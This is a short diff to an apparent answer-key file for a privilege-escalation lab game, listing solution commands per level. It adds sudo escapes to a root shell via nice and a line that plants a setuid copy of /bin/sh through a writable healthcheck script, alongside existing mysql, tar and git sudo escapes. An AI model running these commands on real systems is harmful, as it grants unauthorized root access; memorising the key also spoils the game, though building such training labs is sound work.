@@ -101,6 +101,8 @@ const SOLUTIONS = {
     31: ["sudo mysql -e '\\! /bin/sh'"],
     32: ['sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'],
     33: ['sudo git -p help !/bin/sh'],
+    34: ['sudo nice /bin/sh'],
+    35: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/monitor/healthcheck.sh', 'wait'],
 };
 
 let pass = 0, fail = 0;
